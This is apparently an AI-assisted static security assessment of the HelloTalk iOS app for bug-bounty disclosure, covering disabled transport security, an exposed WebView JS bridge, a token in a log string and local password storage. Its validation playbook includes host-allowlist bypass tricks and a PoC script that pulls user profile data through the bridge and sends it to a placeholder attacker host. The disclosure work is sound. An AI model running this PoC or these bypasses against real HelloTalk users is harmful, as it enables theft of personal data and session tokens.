# HelloTalk iOS — Static Security Assessment (bug-bounty triage)

**Target:** HelloTalk for iOS
**Bundle ID:** `com.helloTalk.helloTalk`
**Version:** 6.4.20 (build 81), MinimumOS 15.0, arm64
**Artifact:** `com.helloTalk.helloTalk_6.4.20_und3fined.ipa` (decrypted), SHA-256 `fe185547bc7cc236311bc4e510f08a9d0a3a25e720ad222c33fd222080b7c0a1`
**Method:** Static analysis only (Linux: LIEF + capstone + a custom chained-fixup ObjC/selector resolver for targeted decompilation; radare2 available). **No dynamic/on-device testing was performed.** Nothing here was tested against HelloTalk's live servers or any real account.
**Date:** 2026-11-11

> ⚠️ Confidence ratings matter. Items marked **NEEDS-DYNAMIC** are *leads*, not proven vulnerabilities. Validate on a device/jailbroken instance or via the program's test environment before submitting, so you don't burn triager goodwill.

---

## Summary

| # | Finding | Severity (if confirmed) | Confidence (static) | Status |
|---|---------|------|------------|--------|
| 1 | App Transport Security fully disabled (`NSAllowsArbitraryLoads=true`) + cleartext first-party endpoints present | Medium | **High (confirmed static)** | Reportable as-is; strengthen with a MITM capture |
| 2 | WebView `callNative` JS bridge exposes sensitive native methods (user profile, `aliPay`/`wechatPay`) to page JS; gated **only** by `HTWebViewSecurityGuard`'s remote-config host allowlist, which also has a server-side kill-switch | High | **Medium** (architecture confirmed by decompilation; bypass not proven) | NEEDS-DYNAMIC |
| 3 | Auth token + userId in a log format string (`HTLoginSuccessModel send token: %@, userId: %@`) | Low–Medium | Medium | NEEDS-DYNAMIC (confirm it reaches device log in release) |
| 4 | "Remember password" stores the account **password** locally (AES); key management unknown | Low–Medium | Medium | NEEDS-DYNAMIC (recover key / inspect container) |
| 5 | Possible open-redirect pivot on first-party domain (`/api/deeplink/redirect`, `openredirect=1`) feeding in-app WebView | Med–High (as a chain) | Low | NEEDS-DYNAMIC (server-side test) |

**Verified NOT issues (checked, ruled out):** no embedded private keys (the `BEGIN … PRIVATE KEY` strings are empty format templates; only *public* keys are embedded); no hardcoded app/cloud secrets in bundle resource files; third-party SDKs are current (Alamofire 5.9.1, SDWebImage 5.21.1, AgoraRtcKit 4.5.2, FBSDKCoreKit 18.1.0, Moya 15, FMDB 2.7.10) — no obvious outdated-library CVE. Binary is PIE with stack canaries, `cryptid=0` (decrypted copy).

---

## Finding 1 — ATS disabled + cleartext first-party endpoints  *(Confirmed static, Medium)*

**Evidence (`Info.plist`):**
```xml
<key>NSAppTransportSecurity</key>
<dict>
  <key>NSAllowsArbitraryLoads</key><true/>
  <key>NSExceptionDomains</key> … facebook.com / fbcdn.net / akamaihd.net …
</dict>
```
`NSAllowsArbitraryLoads=true` disables ATS process-wide: the app *may* make cleartext HTTP(S-optional) connections to any host.

**Cleartext first-party endpoints found in the main binary:**
- `http://ios-api.hellotalk.com/`
- `http://h5.hellotalk8.com/h5live/agreement…`
- `http://lesson.hellotalk8.com/api/lesson/teacher/show/id/…`

No evidence of certificate pinning on the REST stack (AFNetworking/Alamofire/Moya). The only `CertificatePinning` symbols belong to **Starscream** (WebSocket) as an *optional protocol* — no proof a pinner is installed.

**Impact:** On a hostile network (rogue Wi‑Fi, malicious proxy), any traffic that actually uses these HTTP endpoints (or is downgraded) is readable/modifiable → session data exposure, response tampering.

**Validation:** Proxy the app through Burp/mitmproxy on a test device, exercise login/agreement/lesson flows, and confirm whether any request is sent over `http://` and whether swapping the server cert is accepted (no pinning).

**Remediation:** Remove `NSAllowsArbitraryLoads`; use per-domain exceptions only where a vendor truly requires it; force HTTPS for all first-party hosts; add certificate/public-key pinning for the auth/API hosts.

---

## Finding 2 — WebView `callNative` JS bridge: sensitive methods behind one allowlist  *(NEEDS-DYNAMIC, High if the guard is bypassable)*

**Architecture — confirmed by decompiling the main binary (`HelloTalk_Binary`, arm64):**

The in-app browser `SVWebViewController` registers a `WKScriptMessageHandler` named **`callNative`** — and it does so **unconditionally** (`-[SVWebViewController addScriptMessageHandler]` at `0x10421755c` has no host gate). Page JS invokes native code via:
```js
window.webkit.messageHandlers.callNative.postMessage({ action: "<name>", ... })
```
`-[SVWebViewController userContentController:didReceiveScriptMessage:]` (`0x10420ee0c`) parses `message.name == "callNative"`, reads `body["action"]`, logs `WKWebView H5JS methodName:%@ body:%@`, and dispatches `callNative.<action>`.

**The gate is one class: `HTWebViewSecurityGuard`.** The dispatch path references it (classref in `didReceiveScriptMessage`). Its logic (Swift, around `0x1042e1994`–`0x1042e2400`) does three things:
- loads an allowlist via remote config (`arrayConfig:` selector),
- reads a remote **kill-switch** `dev_webjsbridge_whitelist_bypass` (confirmed: it's a real remote-config boolean getter — builds the key string and returns a bool, functions at `0x1042e1648` / `0x1042e1700`),
- matches the current page host against the allowlist (the shipped `WhiteListDomains.plist`: hellotalk.com, hellotalk8.com, hellotalk.cn, …).

**Sensitive native actions reachable through this bridge (confirmed IMPs):**
- `-[SVWebViewController callbackUserInfo]` (`0x10420dbbc`) — assembles **user profile** (reads `HTUserCache`/`OCAppReduxStore`: `registerTimeStamp`, `areacode`, `birthday`, …) and returns it to JS via `hellotalkOnUserInfoCallBack()`.
- `-[SVWebViewController aliPay:]` (`0x10420d63c`) and `wechatPay` — **initiate payment** from JS.
- `callbackGetEnvInfo`, `callbackGetSystemPushNotify`, `socialShareWithInfo:`, `saveImageCallBackWithInfo:`, `pickerImageFromPhoto`.

> Correction vs. first pass: individual handlers (e.g. `callbackUserInfo`) have no per-call host check **because the check is upstream in the dispatch via `HTWebViewSecurityGuard`**. The design is *not* "trivially open." The whole security of the bridge rests on that one guard.

**Why it's still a High-value lead:** the guard is the *single* line of defense, and three things make it worth attacking:
1. **Matching operator unverified.** The host match is Swift `String` comparison (no ObjC selector, so not resolvable from static strings). If it's suffix/`contains`-based rather than exact-host, `hellotalk.com.evil.tld`, `evilhellotalk.com`, or a `.` / `@` / punycode trick bypasses it. **Must be tested.**
2. **Nav policy doesn't help.** `-[SVWebViewController webView:decidePolicyForNavigationAction:]` (`0x10420ab14`) only routes special schemes (`hellotalk://`→`HelloURLNavigator`, App Store / `alipay*` / `mailto` / `youtube` external) and otherwise **allows http/https to load** — it does **not** restrict in-WebView navigation (or redirects) to allowlisted hosts. So a page/redirect can navigate the bridge-enabled WebView off-allowlist; only the guard stands in the way.
3. **Remote kill-switch.** `dev_webjsbridge_whitelist_bypass` can disable the allowlist server-side — a security control that can be turned off remotely.

**Chain to prove on-device:** attacker content reaches `SVWebViewController` (via a chat/moment link, a `hellotalk://` deep link carrying a URL, or an open redirect on an allowlisted host — Finding 5) → guard's host check is bypassed (suffix/redirect) or off → JS calls `callNative` `{action:"userInfo"}` / payment.

**Validation (on device):**
1. Open a controllable URL in the in-app browser; from the page run `window.webkit.messageHandlers.callNative.postMessage({action:"userInfo"})` and watch for `hellotalkOnUserInfoCallBack()`.
2. Fuzz the host matcher: `hellotalk.com.<you>.com`, `<you>hellotalk.com`, `hellotalk.com@<you>.com`, punycode, trailing dot.
3. Test `/api/deeplink/redirect` (Finding 5) as the allowlisted-host entry.

**Remediation:** exact-host match in `HTWebViewSecurityGuard` (never suffix/contains); re-check the guard on **every** navigation/redirect, not just initial load; don't expose profile/payment actions to arbitrary web origins; remove the remote bypass or restrict it to debug builds.

---

## Finding 2b — Second bridge (DSBridge/NTLBridge) exposes `getToken`  *(NEEDS-DYNAMIC, High if reachable)*

Separate from `callNative`, the app embeds **DSBridge** (`NTLBridge.framework` — `NTLDWKWebView`, `addJavascriptObject:namespace:`, `dispatchJavascriptCall:`). In DSBridge, **every method of a registered native object is callable by any JS in that WebView** (DSBridge-iOS has no built-in origin check).

Confirmed by decompilation: the registered `getToken` handler (`0x1052440ac`) logs `JsBridge getToken, args:%@ result:%@`, delegates to `0x102af6128`, which reads a value from an app store/reducer and **returns a token string synchronously to JS**. The handler itself performs **no origin/allowlist check** — any gating is upstream in the DSBridge dispatch / webview-loading layer (likely the same `HTWebViewSecurityGuard` / `dev_webjsbridge_whitelist_bypass` mechanism, whose name "webjsbridge" fits this bridge).

**Impact if reachable:** a token returned to attacker JS = session/account compromise — higher impact than Finding 2's profile read. **Not yet proven:** (a) which token it returns (full session vs. a scoped H5 token — needs dynamic confirmation), (b) which WebViews use the DSBridge path and whether their URLs are allowlisted the same way.

**Validate:** in a DSBridge-enabled page, call the bridge (`window._dsbridge`/`bridge.call("getToken")` depending on the DSBridge JS shim) and inspect the returned value; then test the same allowlist-bypass vectors as Finding 2.

---

## Finding 3 — Auth token + userId in log format string  *(NEEDS-DYNAMIC, Low–Medium)*

**Evidence:** `HTLoginSuccessModel send token: %@, userId: %@` (also `HTLoginSuccessModel afterLoginRequests sendToken == false.`).

**Impact:** If this is an `NSLog`/active logger in release builds, the session token lands in the unified device log — readable via Console/sysdiagnose and historically by other on-device tooling. Token in logs → replayable session.

**Validation:** Install the release build, log in, watch `log stream`/Console for the token. **Remediation:** strip token/PII from release logging.

---

## Finding 4 — "Remember password" stores account password locally  *(NEEDS-DYNAMIC, Low–Medium)*

**Evidence:** `EmailLoginViewModel saveLoginAccountPassword aesDecode Error`, `… store Error`, `saveLoginisRememberPassword`.

**Impact:** The app persists the actual **password** (AES) rather than a revocable token. If the AES key is hardcoded/derivable or the blob sits in NSUserDefaults/plist (not Keychain), an attacker with file access (backup, jailbreak, malware) can recover the plaintext password → full account compromise and credential-stuffing elsewhere.

**Validation:** Enable "remember password," pull the app container, locate the blob, and determine where the key lives (hardcoded? Keychain? device-derived?). **Remediation:** store a revocable token in Keychain (ThisDeviceOnly); never persist the password; if unavoidable, use a Keychain/Secure-Enclave-bound key.

---

## Finding 5 — Open-redirect pivot into in-app WebView  *(NEEDS-DYNAMIC, speculative)*

**Evidence:** `/api/deeplink/redirect`, `&openredirect=1`, `&redirect_url=%@`, and `SVWebViewController webView:didReceiveServerRedirectForProvisionalNavigation:`.

**Why interesting:** If `/api/deeplink/redirect` (on an allowlisted `hellotalk*` host) is an open redirect, it could pass a host allowlist (host = hellotalk.com) while delivering attacker content — the missing first link in the Finding-2 chain. Purely a server-side hypothesis from strings; must be tested against the API.

---

## Suggested next steps

- **Decompiler is now set up here** (capstone + custom chained-fixup selector/ObjC resolver in the session scratchpad: `objc.py`, `dis.py`, `xref.py`). I can keep reversing `HTWebViewSecurityGuard`'s Swift host-match to try to settle the exact operator (exact vs suffix) statically — Swift string-compare is hard but tractable with more effort.
- **To turn Finding 2 into a submission:** on-device dynamic test (Frida/objection + proxy) is the reliable path — enumerate bridge actions, fuzz the `HTWebViewSecurityGuard` host matcher, and prove an off-allowlist page calling `callNative`.
- Report Finding 1 now (self-contained); hold 2–5 until validated.

---

## On-device validation playbook (to turn 2 / 2b into submittable PoCs)

You need a jailbroken iOS device (or a re-signed build) + Frida/objection + a proxy (Burp/mitmproxy). Everything below is testing **your own account** against HelloTalk — no third-party users.

**A. Enumerate the live bridge surface**
```bash
frida-ps -Uai                      # find the running app
objection -g com.helloTalk.helloTalk explore
# in objection:
ios hooking watch class SVWebViewController
ios hooking watch class HTWebViewSecurityGuard      # the gate
```
Hook `-[SVWebViewController userContentController:didReceiveScriptMessage:]` and the `HTWebViewSecurityGuard` check method; log the page URL + the allow/deny result for each navigation.

**B. Get a page you control into the bridge-enabled WebView**
- Try a `hellotalk://` deep link that carries a URL param (enumerate routes via `HelloURLNavigator`/`DeeplinkRouteRegistrar`).
- Try sending yourself an in-chat / moment link and opening it in-app.
- Try the `/api/deeplink/redirect` endpoint (Finding 5) with an external `redirect_url` on an allowlisted host.

**C. Test the `HTWebViewSecurityGuard` host matcher** — host your page on:
`hellotalk.com.<you>.com`, `<you>hellotalk.com`, `hellotalk.com.<you>`, `hellotalk.com@<you>.com`, punycode (`xn--…`), and a trailing-dot host. If the guard uses suffix/`contains`, one of these is allowed.

**D. Fire the bridge from your page**
```html
<script>
// callNative bridge (SVWebViewController)
window.webkit.messageHandlers.callNative.postMessage({action:"userInfo"});
window.hellotalkOnUserInfoCallBack = d => fetch("https://<you>/x?d="+encodeURIComponent(JSON.stringify(d)));
// DSBridge getToken (if NTLDWKWebView): use the page's injected _dsbridge/bridge object
</script>
```
If profile/token data comes back off-allowlist, you have a confirmed report.

**What to submit:** the exact entry point, the bypass host, a minimal PoC page, the data returned, and app version 6.4.20 (81). Report via HelloTalk's official security contact; one issue per report, highest-impact first.

---

**Scope/ethics:** Static review of a decrypted app binary for responsible disclosure. No HelloTalk account, server, or user was touched. Submit confirmed issues through HelloTalk's official security/vulnerability-disclosure channel, and test only against your own account.
